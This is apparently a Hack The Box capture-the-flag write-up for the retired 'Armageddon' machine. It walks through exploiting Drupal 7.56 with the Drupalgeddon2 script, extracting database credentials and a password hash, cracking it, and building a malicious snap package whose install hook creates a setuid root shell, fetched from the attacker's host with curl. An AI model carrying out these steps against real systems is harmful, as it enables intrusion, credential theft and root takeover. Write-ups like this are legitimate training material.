# Armageddon

This is the write-up for the box Armageddon that got retired at the 24th July 2021.
My IP address was 10.10.14.8 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.233   armageddon.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/armageddon.nmap 10.10.10.233
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to  Armageddon |  Armageddon
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
```

## Checking HTTP (Port 80)

The website shows a login form which requires a username and password.
As the initial scan found, a _robots.txt_ file can be accessed, which shows many directories and files.

The file _CHANGELOG.txt_ shows that the web service is running **Drupal 7.56** from June 2017.

Searching for public vulnerabilities:
```
searchsploit drupal 7
```

There are some Remote Code Execution vulnerabilities that are called **Drupalgeddon2** and I will use the Ruby script:
```
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
```

Running the script:
```
ruby 44449.rb http://10.10.10.233/
```

After running the script, it starts a shell session as the user _apache_.

## Privilege Escalation

The file _sites/default/settings.php_ in the web directory contains credentials for a **MySQL** database:
```
(...)
'database' => 'drupal',
'username' => 'drupaluser',
'password' => 'CQHEy@9M*m23gBVj',
'host' => 'localhost',
'port' => '',
'driver' => 'mysql',
(...)
```

The shell from the exploit is not a real TTY shell, so instead of login into the database, commands need to be specified on the command line:
```
mysql -u drupaluser --password=CQHEy@9M*m23gBVj -D drupal -e 'show tables'

mysql -u drupaluser --password=CQHEy@9M*m23gBVj -D drupal -e 'describe users'

mysql -u drupaluser --password=CQHEy@9M*m23gBVj -D drupal -e 'select name, pass from users'
```
```
brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
```

The table _users_ has a hash for the user _brucetherealadmin_ which also exists on the box.

Trying to crack the hash with **John The Ripper**:
```
john drupal.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

The password gets cracked and it is:
> booboo

The password works on the user with SSH:
```
ssh brucetherealadmin@10.10.10.233
```

### Privilege Escalation to root

When checking the permissions of _brucetherealadmin_ with `sudo -l`, the user has privileges to install packages with `snap` as root:
```
User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

The binary _snap_ has an [entry in GTFObins](https://gtfobins.github.io/gtfobins/snap/) which makes it possible to escalate privileges to root.

Installing [fpm](https://github.com/jordansissel/fpm):
```
gem install --no-document fpm
```

Creating a malicious binary:
```
COMMAND="chown root:root /home/brucetherealadmin/bash; chmod 4755 /home/brucetherealadmin/bash"
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
```

Copying `bash` in the home folder of _brucetherealadmin_:
```
cp /usr/bin/bash /home/brucetherealadmin/
```

Uploading package _xxxx_1.0_all.snap_ onto the box:
```
curl 10.10.14.8/xxxx_1.0_all.snap -o privesc.snap
```

Installing package with sudo permissions:
```
sudo snap install privesc.snap --dangerous --devmode
```

After the package is installed, it will execute the specified command and `bash` can be executed:
```
./bash -p
```

The _euid_ is root and thus the privileges got escalated!
